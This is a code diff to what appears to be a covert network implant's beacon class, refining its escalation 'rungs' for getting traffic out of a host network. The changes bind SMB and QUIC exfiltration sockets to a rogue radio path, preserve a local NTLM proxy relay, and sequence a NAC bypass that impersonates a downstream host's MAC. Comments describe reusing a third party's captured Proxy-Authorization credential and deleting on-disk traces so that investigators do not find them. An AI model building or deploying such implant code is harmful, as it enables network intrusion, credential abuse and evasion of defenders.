@@ -2611,6 +2611,11 @@ def _way_out_keeps_a_ladder(policy: dict) -> None:
     """
     coefficient = float(policy["risk_coefficient"])
     threshold = float(policy["ev_threshold"])
+    # The `min` below is unobservable with these rows -- every prior plus
+    # the span is at most 0.7 -- and is recorded here rather than
+    # engineered away, like `_way_out_out_of_order`'s own survivor: it is
+    # there because a clamped value has to stay a probability, which is a
+    # property of the clamp and not of today's table.
     reach = (_WAY_OUT_CLAMP_SPAN
              if (policy.get("model") or {}).get("enabled") else 0.0)
     for rung in sorted(_WAY_OUT_ROW_OF):
@@ -2652,6 +2657,11 @@ def _way_out_least_coefficient(threshold: float, reach: float = 0.0) -> int:
         points, prior, detect = _WAY_OUT_ROWS[row]
         success = min(_WAY_OUT_P_MAX, prior + reach)
         need = (points * success - threshold) / detect
+        # Strictly greater, so the number suggested is one the rule
+        # itself accepts: at a coefficient exactly equal to `need` the
+        # rung is already shut (the gate's comparison is strict), so this
+        # is one more conservative than it has to be -- deliberately, in
+        # advice an operator is going to paste into a file.
         least = max(least, int(math.floor(need)) + 1)
     return least
 
@@ -7464,17 +7474,28 @@ class Beacon:
         self._rescue_answered = False
         self._stuck_cycles = 0
         self._egress_spent = 0
-        # **The stashed tapped path goes, though.** It holds the proxy and
-        # the `Proxy-Authorization` the borrow rung was using before the
-        # radio took over -- a third party's cleartext credential -- and
-        # the bind deliberately survives this call, so the stash survived
-        # with it: a rollback in a *later* outage put a weeks-old Basic
-        # token back on the session and replayed it against the host's
-        # proxy, which is how "an account that locks out" happens. Two
-        # guards exist to stop a capture crossing outages -- the borrow
-        # file's `written < opened` and the scout's own sweep -- and both
-        # are about the file, not about this copy in memory.
-        self._way_out_tapped_path = None
+        # **The stashed credential goes, and only the credential.** The
+        # stash holds the proxy, the headers and `trust_env` the implant
+        # was using on the tapped port before the radio took over, and
+        # the headers are where the borrow rung puts a third party's
+        # `Proxy-Authorization`: the bind deliberately survives this
+        # call, so the stash survived with it, and a rollback in a
+        # *later* outage put a weeks-old Basic token back on the session
+        # and replayed it against the host's proxy -- which is how "an
+        # account that locks out" happens. Two guards exist against a
+        # capture crossing outages and both are about the borrow *file*,
+        # not about this copy in memory.
+        #
+        # Dropping the whole stash was worse, and a review measured it:
+        # the rollback is the only way back to the tapped port, and with
+        # no stash it takes the radio session's own emptiness -- so the
+        # implant came back with no proxy at all and `trust_env` off,
+        # which is `c2.proxy.mode: none` applied with nobody asking. On a
+        # `proxy.ntlm.enabled` build that is the relay's loopback URL
+        # gone, and the relay is the reason a direct POST does not work.
+        if self._way_out_tapped_path is not None:
+            proxies, _headers, trust_env = self._way_out_tapped_path
+            self._way_out_tapped_path = (proxies, {}, trust_env)
         # The one file this project puts on the disk goes with them: the
         # window is over, so the artefact that described it is removed
         # rather than left for the next reader -- or the next investigator
@@ -7609,6 +7630,7 @@ class Beacon:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(15)
+            self._way_out_bind_socket(sock)
             host = self.smb_server
             port = 445
             if ":" in host:
@@ -7927,6 +7949,7 @@ class Beacon:
 
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.settimeout(10)
+            self._way_out_bind_socket(sock)
 
             # Fragment into 1200-byte QUIC-style datagrams
             frag_size = 1200
@@ -10835,6 +10858,21 @@ class Beacon:
             self._way_out_source = address
             session = self._bound_session()
             session.trust_env = False
+            # **A proxy on this host comes with us.** The reason to stash
+            # the rest is that a proxy on the *host's network* is not
+            # reachable from the radio's -- and `127.0.0.1` is reachable
+            # from every path. On a `proxy.ntlm.enabled` build the
+            # session's proxy *is* the local relay's listener, and
+            # stashing it meant nothing went through the relay after rung
+            # 3: the hop this rung carefully binds in
+            # `_NtlmProxyRelay._connect_upstream` had nothing to carry,
+            # and both docstrings described a configuration the bind had
+            # just destroyed.
+            if previous is not None:
+                kept = {scheme: url for scheme, url in previous.proxies.items()
+                        if self._is_loopback_base(url)}
+                if kept:
+                    session.proxies = kept
         elif not address and self._way_out_tapped_path is not None:
             # Back on the tapped port: its proxy was right there, and it
             # is this rung's business to leave the implant as it found it.
@@ -10876,6 +10914,34 @@ class Beacon:
         relay = self._ntlm_relay
         if relay is not None:
             relay.source_address = (address, 0) if address else None
+
+    def _way_out_bind_socket(self, sock) -> None:
+        """Bind a leg's own socket to the radio rung's lease. Raises nothing.
+
+        `_bound_session` owns the invariant for everything that goes
+        through `_HttpSession`, and `_dns_query` takes a `source` -- but
+        the SMB and QUIC legs build raw sockets of their own, and they
+        took no bind at all. Two of the four names in `_RESCUE_UPSTREAM`,
+        both advertised in the README and both configured beside gsocket
+        in the shipped yaml: on a build whose primary leg is either of
+        them, rung 3 answered "this implant's own traffic only" and
+        changed nothing about where that leg's packets went. That is
+        round two's Critical -- a route with nothing bound to its source
+        -- through two doors the one-owner fix never reached, because
+        "every socket this implant opens" was a claim about one class
+        read as a claim about the device.
+
+        A bind that fails **fails the leg**, and that is deliberate: the
+        lease may have gone while the leg was being built, and a socket
+        that silently fell back to the kernel's choice would leave by the
+        tapped port -- the port this rung exists to get off -- while the
+        rung's own answer says otherwise. Both callers already run inside
+        a `try` that turns an `OSError` into "this leg did not deliver",
+        which is the honest reading and the one the operator can act on.
+        """
+        if not self._way_out_source:
+            return
+        sock.bind((self._way_out_source, 0))
 
     def _bound_session(self) -> "_HttpSession":
         """A fresh HTTP session that still leaves by the leased address.
@@ -10977,6 +11043,27 @@ class Beacon:
                     "nac_bypass.enabled is true, so the identity was taken "
                     "at boot and the rung is already spent. Nothing was "
                     "changed.")
+        # **The radio rung goes first.** Rung 4's whole effect is on the
+        # tapped port: `nac_bypass` rewrites what leaves `eth0` and `br0`
+        # under the host's MAC. While rung 3 holds a lease every socket
+        # this implant opens is pinned to the radio's address, so
+        # `ip rule from <lease> table 100` matches and the traffic leaves
+        # by `wlan0` -- the identity would be taken, the one-shot spent,
+        # and not one byte of this beacon's traffic would use it. The two
+        # rungs cannot both be the way out, and the one that cannot be
+        # undone is the one that wins. A rollback also puts the tapped
+        # path's proxy back, which is where the implant is going.
+        rolled = ""
+        if self._way_out_source:
+            iface, _why = self._radio_iface()
+            self._radio_rollback(iface or "", self._way_out_source,
+                                 "rung 4 takes the host's identity on the "
+                                 "tapped port, so the radio rung's scoped "
+                                 "route and source bind cannot stay")
+            rolled = (" The radio rung was rolled back first: this rung's "
+                      "effect is on the tapped port, and a source bind to "
+                      "the radio's lease would have sent every socket past "
+                      "it.")
         self._way_out_write(_WAY_OUT_IDENTITY_NAME, {
             "version": _WAY_OUT_STATE_VERSION,
             "requested": time.time(),
@@ -11001,8 +11088,8 @@ class Beacon:
         return ("Identity requested: the implant has asked its own main "
                 "process to start nac_bypass, which forwards EAPOL and then "
                 "originates this implant's traffic as the downstream host. "
-                "Once per deployment. Not a test of the way out: the next "
-                "check-in is")
+                "Once per deployment.%s Not a test of the way out: the next "
+                "check-in is" % rolled)
 
     # ── Deciding to get out, when nobody can be asked ──
 
